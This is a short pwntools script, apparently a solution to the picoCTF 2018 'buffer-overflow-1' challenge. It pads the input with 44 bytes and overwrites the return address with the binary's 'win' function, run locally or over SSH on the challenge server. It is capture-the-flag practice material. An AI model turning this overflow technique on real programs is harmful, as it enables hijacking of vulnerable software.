#!/usr/bin/env python

from pwn import *
import sys

argv = len(sys.argv)

#get win_addr
e = ELF('./vuln')
win = e.symbols['win']

#start process locally or remotely based on args given
if argv > 1:
	from getpass import getpass
	ssh = ssh(host='2018shell.picoctf.com', user='ems3t', password=getpass())
	p = ssh.process('vuln', cwd='/problems/buffer-overflow-1_0_787812af44ed1f8151c893455eb1a613')
else:
	p = process('./vuln')
'''
pwn cyclic 50 | strace ./vuln
pwn cyclic -l 0x6161616c
44
'''
#set buf amount
buf = 44 

#build payload
payload = ''
payload+= 'A'*buf
payload+=p32(win)

#send exploit and start interactive mode
p.sendline(payload)
p.interactive()